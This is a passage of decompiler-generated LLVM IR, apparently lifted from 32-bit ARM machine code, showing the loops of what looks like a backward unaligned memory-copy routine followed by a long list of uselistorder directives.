  store i1 %v6_18e40, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18e40, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18e48

dec_label_pc_18e48:                               ; preds = %dec_label_pc_18e48.loopexit, %dec_label_pc_18e24
  %v2_18d8c63 = phi i32 [ %v5_18e3c, %dec_label_pc_18e48.loopexit ], [ %v1_18e18, %dec_label_pc_18e24 ]
  %v0_18d7c59 = phi i32 [ %v2_18e40, %dec_label_pc_18e48.loopexit ], [ %v2_18e28, %dec_label_pc_18e24 ]
  %v0_18e48 = load i32, i32* %r1.global-to-local, align 4
  %v1_18e48 = add i32 %v0_18e48, 3
  store i32 %v1_18e48, i32* %r1.global-to-local, align 4
  br label %bb143

dec_label_pc_18e50:                               ; preds = %dec_label_pc_18de0
  br i1 %v5_18ec0, label %dec_label_pc_18e9c, label %dec_label_pc_18e58

dec_label_pc_18e58:                               ; preds = %dec_label_pc_18e50
  store i32 %v2_18ebc, i32* %r2.global-to-local, align 4
  %v3_18e5c = load i32, i32* @r4, align 4
  store i32 %v3_18e5c, i32* %stack_var_-12, align 4
  %v6_18e5c = load i32, i32* @r5, align 4
  %v8_18e5c = inttoptr i32 %v6_18e5c to i8*
  store i8* %v8_18e5c, i8** %stack_var_-8, align 4
  %v11_18e5c = load i32, i32* @lr, align 4
  br label %dec_label_pc_18e60

dec_label_pc_18e60:                               ; preds = %dec_label_pc_18e60.dec_label_pc_18e60_crit_edge, %dec_label_pc_18e58
  %v0_18e84 = phi i32 [ %v1_18e84, %dec_label_pc_18e60.dec_label_pc_18e60_crit_edge ], [ %v0_18e1831, %dec_label_pc_18e58 ]
  %v0_18e64 = phi i32 [ %v0_18e64.pre, %dec_label_pc_18e60.dec_label_pc_18e60_crit_edge ], [ %v1_18dd0, %dec_label_pc_18e58 ]
  %v0_18e60 = phi i32 [ %v0_18e60.pre, %dec_label_pc_18e60.dec_label_pc_18e60_crit_edge ], [ %v2_18dd4, %dec_label_pc_18e58 ]
  %v3_18e60 = mul i32 %v0_18e60, 65536
  store i32 %v3_18e60, i32* %lr.global-to-local, align 4
  %v1_18e64 = add i32 %v0_18e64, -4
  %v2_18e64 = inttoptr i32 %v1_18e64 to i32*
  %v3_18e64 = load i32, i32* %v2_18e64, align 4
  store i32 %v3_18e64, i32* %r3.global-to-local, align 4
  %v4_18e64 = add i32 %v0_18e64, -8
  %v5_18e64 = inttoptr i32 %v4_18e64 to i32*
  %v6_18e64 = load i32, i32* %v5_18e64, align 4
  store i32 %v6_18e64, i32* %r4.global-to-local, align 4
  %v7_18e64 = add i32 %v0_18e64, -12
  %v8_18e64 = inttoptr i32 %v7_18e64 to i32*
  %v9_18e64 = load i32, i32* %v8_18e64, align 4
  store i32 %v9_18e64, i32* %r5.global-to-local, align 4
  %v10_18e64 = add i32 %v0_18e64, -16
  %v11_18e64 = inttoptr i32 %v10_18e64 to i32*
  %v12_18e64 = load i32, i32* %v11_18e64, align 4
  store i32 %v10_18e64, i32* %r1.global-to-local, align 4
  %v4_18e68 = udiv i32 %v12_18e64, 65536
  %v5_18e68 = or i32 %v4_18e68, %v3_18e60
  store i32 %v5_18e68, i32* %lr.global-to-local, align 4
  %v3_18e6c = mul i32 %v12_18e64, 65536
  %v4_18e70 = udiv i32 %v9_18e64, 65536
  %v5_18e70 = or i32 %v3_18e6c, %v4_18e70
  store i32 %v5_18e70, i32* @ip, align 4
  %v3_18e74 = mul i32 %v9_18e64, 65536
  %v4_18e78 = udiv i32 %v6_18e64, 65536
  %v5_18e78 = or i32 %v3_18e74, %v4_18e78
  store i32 %v5_18e78, i32* %r5.global-to-local, align 4
  %v3_18e7c = mul i32 %v6_18e64, 65536
  %v4_18e80 = udiv i32 %v3_18e64, 65536
  %v5_18e80 = or i32 %v3_18e7c, %v4_18e80
  store i32 %v5_18e80, i32* %r4.global-to-local, align 4
  %v1_18e84 = add i32 %v0_18e84, -16
  %v2_18e84 = inttoptr i32 %v1_18e84 to i32*
  store i32 %v5_18e80, i32* %v2_18e84, align 4
  %v4_18e84 = add i32 %v0_18e84, -12
  %v5_18e84 = inttoptr i32 %v4_18e84 to i32*
  %v6_18e84 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_18e84, i32* %v5_18e84, align 4
  %v7_18e84 = add i32 %v0_18e84, -8
  %v8_18e84 = inttoptr i32 %v7_18e84 to i32*
  %v9_18e84 = load i32, i32* @ip, align 4
  store i32 %v9_18e84, i32* %v8_18e84, align 4
  %v10_18e84 = add i32 %v0_18e84, -4
  %v11_18e84 = inttoptr i32 %v10_18e84 to i32*
  %v12_18e84 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18e84, i32* %v11_18e84, align 4
  store i32 %v1_18e84, i32* %r0.global-to-local, align 4
  %v0_18e88 = load i32, i32* %r2.global-to-local, align 4
  %v2_18e88 = add i32 %v0_18e88, -16
  store i32 %v2_18e88, i32* %r2.global-to-local, align 4
  %v6_18e8c = icmp slt i32 %v0_18e88, 16
  br i1 %v6_18e8c, label %dec_label_pc_18e90, label %dec_label_pc_18e60.dec_label_pc_18e60_crit_edge

dec_label_pc_18e60.dec_label_pc_18e60_crit_edge:  ; preds = %dec_label_pc_18e60
  %v0_18e60.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_18e64.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18e60

dec_label_pc_18e90:                               ; preds = %dec_label_pc_18e60
  %v2_18e90 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18e90, i32* @r4, align 4
  %v5_18e90 = load i8*, i8** %stack_var_-8, align 4
  %v6_18e90 = ptrtoint i8* %v5_18e90 to i32
  store i32 %v6_18e90, i32* @r5, align 4
  store i32 %v11_18e5c, i32* @lr, align 4
  %v2_18e94 = add i32 %v0_18e88, -4
  store i32 %v2_18e94, i32* %r2.global-to-local, align 4
  %v4_18e94 = add i32 %v0_18e88, 2147483632
  %v5_18e94 = and i32 %v2_18e94, %v4_18e94
  %v6_18e94 = icmp slt i32 %v5_18e94, 0
  store i1 %v6_18e94, i1* %cpsr_v.global-to-local, align 1
  %v7_18e94 = icmp slt i32 %v2_18e94, 0
  store i1 %v7_18e94, i1* %cpsr_n.global-to-local, align 1
  %v5_18e98 = icmp slt i32 %v2_18e88, -12
  br i1 %v5_18e98, label %dec_label_pc_18eb4, label %dec_label_pc_18e9c

dec_label_pc_18e9c:                               ; preds = %dec_label_pc_18e90, %dec_label_pc_18e50, %dec_label_pc_18e9c
  %v1_18ea8 = phi i32 [ %v5_18ea8, %dec_label_pc_18e9c ], [ %v1_18e84, %dec_label_pc_18e90 ], [ %v0_18e1831, %dec_label_pc_18e50 ]
  %v0_18e9c = load i32, i32* %r3.global-to-local, align 4
  %v3_18e9c = mul i32 %v0_18e9c, 65536
  store i32 %v3_18e9c, i32* %ip.global-to-local, align 4
  %v0_18ea0 = load i32, i32* %r1.global-to-local, align 4
  %v1_18ea0 = add i32 %v0_18ea0, -4
  %v2_18ea0 = inttoptr i32 %v1_18ea0 to i32*
  %v3_18ea0 = load i32, i32* %v2_18ea0, align 4
  store i32 %v3_18ea0, i32* %r3.global-to-local, align 4
  store i32 %v1_18ea0, i32* %r1.global-to-local, align 4
  %v4_18ea4 = udiv i32 %v3_18ea0, 65536
  %v5_18ea4 = or i32 %v4_18ea4, %v3_18e9c
  store i32 %v5_18ea4, i32* @ip, align 4
  %v2_18ea8 = add i32 %v1_18ea8, -4
  %v3_18ea8 = inttoptr i32 %v2_18ea8 to i32*
  store i32 %v5_18ea4, i32* %v3_18ea8, align 4
  %v4_18ea8 = load i32, i32* %r0.global-to-local, align 4
  %v5_18ea8 = add i32 %v4_18ea8, -4
  store i32 %v5_18ea8, i32* %r0.global-to-local, align 4
  %v0_18eac = load i32, i32* %r2.global-to-local, align 4
  %v2_18eac = add i32 %v0_18eac, -4
  store i32 %v2_18eac, i32* %r2.global-to-local, align 4
  %v6_18eb0 = icmp slt i32 %v0_18eac, 4
  br i1 %v6_18eb0, label %dec_label_pc_18eb4.loopexit, label %dec_label_pc_18e9c

dec_label_pc_18eb4.loopexit:                      ; preds = %dec_label_pc_18e9c
  %v4_18eac = sub i32 3, %v0_18eac
  %v5_18eac = and i32 %v4_18eac, %v0_18eac
  %v6_18eac = icmp slt i32 %v5_18eac, 0
  %v7_18eac = icmp slt i32 %v2_18eac, 0
  store i1 %v6_18eac, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18eac, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18eb4

dec_label_pc_18eb4:                               ; preds = %dec_label_pc_18eb4.loopexit, %dec_label_pc_18e90
  %v2_18d8c64 = phi i32 [ %v5_18ea8, %dec_label_pc_18eb4.loopexit ], [ %v1_18e84, %dec_label_pc_18e90 ]
  %v0_18d7c60 = phi i32 [ %v2_18eac, %dec_label_pc_18eb4.loopexit ], [ %v2_18e94, %dec_label_pc_18e90 ]
  %v0_18eb4 = load i32, i32* %r1.global-to-local, align 4
  %v1_18eb4 = add i32 %v0_18eb4, 2
  store i32 %v1_18eb4, i32* %r1.global-to-local, align 4
  br label %bb143

dec_label_pc_18ebc:                               ; preds = %dec_label_pc_18dd0
  br i1 %v5_18ec0, label %dec_label_pc_18f08, label %dec_label_pc_18ec4

dec_label_pc_18ec4:                               ; preds = %dec_label_pc_18ebc
  store i32 %v2_18ebc, i32* %r2.global-to-local, align 4
  %v3_18ec8 = load i32, i32* @r4, align 4
  store i32 %v3_18ec8, i32* %stack_var_-12, align 4
  %v6_18ec8 = load i32, i32* @r5, align 4
  %v8_18ec8 = inttoptr i32 %v6_18ec8 to i8*
  store i8* %v8_18ec8, i8** %stack_var_-8, align 4
  %v11_18ec8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_18ecc

dec_label_pc_18ecc:                               ; preds = %dec_label_pc_18ecc.dec_label_pc_18ecc_crit_edge, %dec_label_pc_18ec4
  %v0_18ef0 = phi i32 [ %v1_18ef0, %dec_label_pc_18ecc.dec_label_pc_18ecc_crit_edge ], [ %v0_18e1831, %dec_label_pc_18ec4 ]
  %v0_18ed0 = phi i32 [ %v0_18ed0.pre, %dec_label_pc_18ecc.dec_label_pc_18ecc_crit_edge ], [ %v1_18dd0, %dec_label_pc_18ec4 ]
  %v0_18ecc = phi i32 [ %v0_18ecc.pre, %dec_label_pc_18ecc.dec_label_pc_18ecc_crit_edge ], [ %v2_18dd4, %dec_label_pc_18ec4 ]
  %v3_18ecc = mul i32 %v0_18ecc, 16777216
  store i32 %v3_18ecc, i32* %lr.global-to-local, align 4
  %v1_18ed0 = add i32 %v0_18ed0, -4
  %v2_18ed0 = inttoptr i32 %v1_18ed0 to i32*
  %v3_18ed0 = load i32, i32* %v2_18ed0, align 4
  store i32 %v3_18ed0, i32* %r3.global-to-local, align 4
  %v4_18ed0 = add i32 %v0_18ed0, -8
  %v5_18ed0 = inttoptr i32 %v4_18ed0 to i32*
  %v6_18ed0 = load i32, i32* %v5_18ed0, align 4
  store i32 %v6_18ed0, i32* %r4.global-to-local, align 4
  %v7_18ed0 = add i32 %v0_18ed0, -12
  %v8_18ed0 = inttoptr i32 %v7_18ed0 to i32*
  %v9_18ed0 = load i32, i32* %v8_18ed0, align 4
  store i32 %v9_18ed0, i32* %r5.global-to-local, align 4
  %v10_18ed0 = add i32 %v0_18ed0, -16
  %v11_18ed0 = inttoptr i32 %v10_18ed0 to i32*
  %v12_18ed0 = load i32, i32* %v11_18ed0, align 4
  store i32 %v10_18ed0, i32* %r1.global-to-local, align 4
  %v4_18ed4 = udiv i32 %v12_18ed0, 256
  %v5_18ed4 = or i32 %v4_18ed4, %v3_18ecc
  store i32 %v5_18ed4, i32* %lr.global-to-local, align 4
  %v3_18ed8 = mul i32 %v12_18ed0, 16777216
  %v4_18edc = udiv i32 %v9_18ed0, 256
  %v5_18edc = or i32 %v3_18ed8, %v4_18edc
  store i32 %v5_18edc, i32* @ip, align 4
  %v3_18ee0 = mul i32 %v9_18ed0, 16777216
  %v4_18ee4 = udiv i32 %v6_18ed0, 256
  %v5_18ee4 = or i32 %v3_18ee0, %v4_18ee4
  store i32 %v5_18ee4, i32* %r5.global-to-local, align 4
  %v3_18ee8 = mul i32 %v6_18ed0, 16777216
  %v4_18eec = udiv i32 %v3_18ed0, 256
  %v5_18eec = or i32 %v3_18ee8, %v4_18eec
  store i32 %v5_18eec, i32* %r4.global-to-local, align 4
  %v1_18ef0 = add i32 %v0_18ef0, -16
  %v2_18ef0 = inttoptr i32 %v1_18ef0 to i32*
  store i32 %v5_18eec, i32* %v2_18ef0, align 4
  %v4_18ef0 = add i32 %v0_18ef0, -12
  %v5_18ef0 = inttoptr i32 %v4_18ef0 to i32*
  %v6_18ef0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_18ef0, i32* %v5_18ef0, align 4
  %v7_18ef0 = add i32 %v0_18ef0, -8
  %v8_18ef0 = inttoptr i32 %v7_18ef0 to i32*
  %v9_18ef0 = load i32, i32* @ip, align 4
  store i32 %v9_18ef0, i32* %v8_18ef0, align 4
  %v10_18ef0 = add i32 %v0_18ef0, -4
  %v11_18ef0 = inttoptr i32 %v10_18ef0 to i32*
  %v12_18ef0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18ef0, i32* %v11_18ef0, align 4
  store i32 %v1_18ef0, i32* %r0.global-to-local, align 4
  %v0_18ef4 = load i32, i32* %r2.global-to-local, align 4
  %v2_18ef4 = add i32 %v0_18ef4, -16
  store i32 %v2_18ef4, i32* %r2.global-to-local, align 4
  %v6_18ef8 = icmp slt i32 %v0_18ef4, 16
  br i1 %v6_18ef8, label %dec_label_pc_18efc, label %dec_label_pc_18ecc.dec_label_pc_18ecc_crit_edge

dec_label_pc_18ecc.dec_label_pc_18ecc_crit_edge:  ; preds = %dec_label_pc_18ecc
  %v0_18ecc.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_18ed0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18ecc

dec_label_pc_18efc:                               ; preds = %dec_label_pc_18ecc
  %v2_18efc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18efc, i32* @r4, align 4
  %v5_18efc = load i8*, i8** %stack_var_-8, align 4
  %v6_18efc = ptrtoint i8* %v5_18efc to i32
  store i32 %v6_18efc, i32* @r5, align 4
  store i32 %v11_18ec8, i32* @lr, align 4
  %v2_18f00 = add i32 %v0_18ef4, -4
  store i32 %v2_18f00, i32* %r2.global-to-local, align 4
  %v4_18f00 = add i32 %v0_18ef4, 2147483632
  %v5_18f00 = and i32 %v2_18f00, %v4_18f00
  %v6_18f00 = icmp slt i32 %v5_18f00, 0
  store i1 %v6_18f00, i1* %cpsr_v.global-to-local, align 1
  %v7_18f00 = icmp slt i32 %v2_18f00, 0
  store i1 %v7_18f00, i1* %cpsr_n.global-to-local, align 1
  %v5_18f04 = icmp slt i32 %v2_18ef4, -12
  br i1 %v5_18f04, label %dec_label_pc_18f20, label %dec_label_pc_18f08

dec_label_pc_18f08:                               ; preds = %dec_label_pc_18efc, %dec_label_pc_18ebc, %dec_label_pc_18f08
  %v1_18f14 = phi i32 [ %v5_18f14, %dec_label_pc_18f08 ], [ %v1_18ef0, %dec_label_pc_18efc ], [ %v0_18e1831, %dec_label_pc_18ebc ]
  %v0_18f08 = load i32, i32* %r3.global-to-local, align 4
  %v3_18f08 = mul i32 %v0_18f08, 16777216
  store i32 %v3_18f08, i32* %ip.global-to-local, align 4
  %v0_18f0c = load i32, i32* %r1.global-to-local, align 4
  %v1_18f0c = add i32 %v0_18f0c, -4
  %v2_18f0c = inttoptr i32 %v1_18f0c to i32*
  %v3_18f0c = load i32, i32* %v2_18f0c, align 4
  store i32 %v3_18f0c, i32* %r3.global-to-local, align 4
  store i32 %v1_18f0c, i32* %r1.global-to-local, align 4
  %v4_18f10 = udiv i32 %v3_18f0c, 256
  %v5_18f10 = or i32 %v4_18f10, %v3_18f08
  store i32 %v5_18f10, i32* @ip, align 4
  %v2_18f14 = add i32 %v1_18f14, -4
  %v3_18f14 = inttoptr i32 %v2_18f14 to i32*
  store i32 %v5_18f10, i32* %v3_18f14, align 4
  %v4_18f14 = load i32, i32* %r0.global-to-local, align 4
  %v5_18f14 = add i32 %v4_18f14, -4
  store i32 %v5_18f14, i32* %r0.global-to-local, align 4
  %v0_18f18 = load i32, i32* %r2.global-to-local, align 4
  %v2_18f18 = add i32 %v0_18f18, -4
  store i32 %v2_18f18, i32* %r2.global-to-local, align 4
  %v6_18f1c = icmp slt i32 %v0_18f18, 4
  br i1 %v6_18f1c, label %dec_label_pc_18f20.loopexit, label %dec_label_pc_18f08

dec_label_pc_18f20.loopexit:                      ; preds = %dec_label_pc_18f08
  %v4_18f18 = sub i32 3, %v0_18f18
  %v5_18f18 = and i32 %v4_18f18, %v0_18f18
  %v6_18f18 = icmp slt i32 %v5_18f18, 0
  %v7_18f18 = icmp slt i32 %v2_18f18, 0
  store i1 %v6_18f18, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18f18, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18f20

dec_label_pc_18f20:                               ; preds = %dec_label_pc_18f20.loopexit, %dec_label_pc_18efc
  %v2_18d8c65 = phi i32 [ %v5_18f14, %dec_label_pc_18f20.loopexit ], [ %v1_18ef0, %dec_label_pc_18efc ]
  %v0_18d7c61 = phi i32 [ %v2_18f18, %dec_label_pc_18f20.loopexit ], [ %v2_18f00, %dec_label_pc_18efc ]
  %v0_18f20 = load i32, i32* %r1.global-to-local, align 4
  %v1_18f20 = add i32 %v0_18f20, 1
  store i32 %v1_18f20, i32* %r1.global-to-local, align 4
  br label %bb143

; uselistorder directives
  uselistorder i32 %v5_18f14, { 0, 2, 1 }
  uselistorder i32 %v3_18f08, { 1, 0 }
  uselistorder i32 %v2_18f00, { 0, 2, 1, 3 }
  uselistorder i32 %v1_18ef0, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_18ed0, { 1, 0 }
  uselistorder i32 %v3_18ecc, { 1, 0 }
  uselistorder i32 %v0_18ed0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18ef0, { 3, 2, 1, 0 }
  uselistorder i32 %v5_18ea8, { 0, 2, 1 }
  uselistorder i32 %v3_18e9c, { 1, 0 }
  uselistorder i32 %v2_18e94, { 0, 2, 1, 3 }
  uselistorder i32 %v1_18e84, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_18e64, { 1, 0 }
  uselistorder i32 %v3_18e60, { 1, 0 }
  uselistorder i32 %v0_18e64, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18e84, { 3, 2, 1, 0 }
  uselistorder i32 %v5_18e3c, { 0, 2, 1 }
  uselistorder i32 %v3_18e30, { 1, 0 }
  uselistorder i32 %v2_18e28, { 0, 2, 1, 3 }
  uselistorder i32 %v1_18e18, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_18df8, { 1, 0 }
  uselistorder i32 %v3_18df4, { 1, 0 }
  uselistorder i32 %v0_18df8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18e18, { 3, 2, 1, 0 }
  uselistorder i1 %v5_18ec0, { 2, 0, 1 }
  uselistorder i32 %v0_18dd8, { 1, 0 }
  uselistorder i32 %v0_18ec4, { 3, 0, 2, 1 }
  uselistorder i32 %v0_18e1831, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_18dc8, { 2, 1, 0 }
  uselistorder i32 %v0_18dc8, { 2, 0, 1 }
  uselistorder i32 %v2_18dc0, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_18dc0, { 1, 0, 2 }
  uselistorder i32 %v0_18dc0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_18e1832, { 2, 1, 0 }
  uselistorder i32 %v11_18d9c, { 1, 0 }
  uselistorder i32 %v7_18d9c, { 1, 0 }
  uselistorder i32 %v1_18d7c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_18d7c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_18d80, { 1, 0 }
  uselistorder i32 %v7_18d74, { 0, 2, 1 }
  uselistorder i32 %v10_18d70, { 1, 0 }
  uselistorder i32 %v9_18d68, { 1, 0, 2 }
  uselistorder i32 %v6_18d64, { 1, 0 }
  uselistorder i32 %v2_18d5c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_18d5c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_18d6c, { 0, 3, 2, 1 }
  uselistorder i32 %v7_18d50, { 0, 2, 1 }
  uselistorder i32 %v13_18d4c, { 1, 0 }
  uselistorder i32 %v4_18d48, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18d48, { 2, 0, 1 }
  uselistorder i32 %v6_18d50, { 0, 3, 2, 1 }
  uselistorder i32 %v7_18d40, { 0, 2, 1 }
  uselistorder i32 %v16_18d3c, { 1, 0 }
  uselistorder i32 %v4_18d38, { 1, 0 }
  uselistorder i32 %v0_18d48.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_18d40, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_18d2c, { 0, 3, 2, 1 }
  uselistorder i32 %v10_18d28, { 1, 0 }
  uselistorder i32 %v1_18d24, { 1, 0 }
  uselistorder i32 %v10_18d20, { 1, 0 }
  uselistorder i32 %v0_18d20, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18d24, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_18d18, { 0, 2, 1 }
  uselistorder i32 %v2_18d0c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_18d0c, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_18d2449, { 1, 2, 0 }
  uselistorder i32 %v1_18d04, { 2, 1, 0 }
  uselistorder i32 %v1_18cfc, { 2, 3, 1, 0 }
  uselistorder i32 %v2_18cf4, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_18cf0, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_18cec, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_18cec, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_18cd8, { 0, 2, 1 }
  uselistorder i32 %v3_18ccc, { 1, 0 }
  uselistorder i32 %v2_18cc4, { 0, 2, 1, 3 }
  uselistorder i32 %v12_18cb4, { 1, 0, 3, 2 }
  uselistorder i32 %v8_18c94, { 1, 0, 2 }
  uselistorder i32 %v5_18c94, { 1, 0, 2 }
  uselistorder i32 %v2_18c94, { 1, 0, 2 }
  uselistorder i32 %v3_18c90, { 1, 0 }
  uselistorder i32 %v0_18c94, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18cb4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_18c6c, { 0, 2, 1 }
  uselistorder i32 %v3_18c60, { 1, 0 }
  uselistorder i32 %v2_18c58, { 0, 2, 1, 3 }
  uselistorder i32 %v12_18c48, { 1, 0, 3, 2 }
  uselistorder i32 %v8_18c28, { 1, 0, 2 }
  uselistorder i32 %v5_18c28, { 1, 0, 2 }
  uselistorder i32 %v2_18c28, { 1, 0, 2 }
  uselistorder i32 %v3_18c24, { 1, 0 }
  uselistorder i32 %v0_18c28, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18c48, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_18c00, { 0, 2, 1 }
  uselistorder i32 %v3_18bf4, { 1, 0 }
  uselistorder i32 %v2_18bec, { 0, 2, 1, 3 }
  uselistorder i32 %v12_18bdc, { 1, 0, 3, 2 }
  uselistorder i32 %v8_18bbc, { 1, 0, 2 }
  uselistorder i32 %v5_18bbc, { 1, 0, 2 }
  uselistorder i32 %v2_18bbc, { 1, 0, 2 }
  uselistorder i32 %v3_18bb8, { 1, 0 }
  uselistorder i32 %v0_18bbc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18bdc, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_18c84, { 2, 0, 1 }
  uselistorder i32 %v0_18c88, { 3, 0, 2, 1 }
  uselistorder i32 %v0_18bdc75, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_18b8c, { 1, 0 }
  uselistorder i32 %v0_18b8c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_18b84, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_18b84, { 1, 0, 2 }
  uselistorder i32 %v0_18b84, { 2, 0, 1, 3 }
  uselistorder i32 %v0_18bdc76, { 2, 1, 0 }
  uselistorder i32 %v1_18b64, { 1, 0, 2 }
  uselistorder i32 %v1_18b3c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_18b3c, { 1, 2, 0, 3 }
  uselistorder i32 %v8_18b28, { 1, 0, 2 }
  uselistorder i32 %v6_18b24, { 1, 0 }
  uselistorder i32 %v2_18b1c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_18b1c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_18b2c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_18b14, { 0, 2, 1 }
  uselistorder i1 %v0_18b14, { 1, 0 }
  uselistorder i1 %v1_18b14, { 1, 0 }
  uselistorder i32 %v3_18b10, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_18b08, { 0, 2, 1, 3 }
  uselistorder i32 %v4_18af4, { 1, 0 }
  uselistorder i32 %v12_18ae8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_18adc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18ae0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_18ad0, { 0, 2, 1 }
  uselistorder i32 %v2_18ac8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_18ac8, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_18ac0, { 1, 0 }
  uselistorder i32 %v1_18ab8, { 2, 1, 0 }
  uselistorder i32 %v2_18ab0, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_18ab0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_18aa0, { 1, 0 }
  uselistorder i32 %v1_18aa0, { 1, 5, 3, 4, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_18aa0, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 15, 16, 17, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 24, 25, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 39, 40, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 30, 1, 2, 3, 4, 5, 31, 6, 7, 8, 9, 10, 32, 11, 12, 13, 14, 15, 33, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 34, 60, 68, 61, 62, 63, 64, 35, 65, 36, 37, 38, 39, 40, 66, 41, 42, 43, 44, 45, 67, 46, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 69 }
  uselistorder i32* %r1.global-to-local, { 2, 5, 3, 17, 4, 6, 8, 10, 7, 18, 9, 11, 13, 15, 12, 19, 14, 16, 20, 25, 21, 22, 23, 24, 26, 27, 29, 28, 30, 31, 40, 32, 33, 41, 34, 42, 35, 43, 36, 37, 38, 39, 44, 83, 85, 81, 86, 84, 87, 46, 48, 45, 55, 47, 49, 51, 53, 50, 56, 52, 54, 57, 58, 63, 59, 60, 61, 62, 64, 65, 67, 66, 68, 69, 82, 70, 71, 75, 72, 76, 73, 77, 74, 78, 79, 80, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 25, 4, 5, 26, 6, 7, 27, 8, 9, 10, 11, 12, 13, 28, 14, 16, 15, 17, 18, 29, 19, 20, 30, 21, 22, 23, 24, 31, 57, 59, 60, 32, 39, 33, 34, 40, 35, 36, 37, 38, 41, 42, 0, 43, 44, 46, 45, 47, 48, 58, 49, 50, 51, 54, 52, 53, 55, 56, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 11, 12, 5, 6, 7, 8, 9, 10, 13 }
  uselistorder i1* %cpsr_v.global-to-local, { 3, 7, 4, 9, 5, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 23, 0, 39, 6, 24, 1, 25, 40, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 41, 42 }
  uselistorder i1* %cpsr_n.global-to-local, { 3, 7, 4, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 2, 22, 23, 24, 25, 26, 0, 43, 5, 27, 1, 28, 44, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 45, 46, 47, 48 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 27, { 1, 0, 2 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_18f08, { 2, 0, 1 }
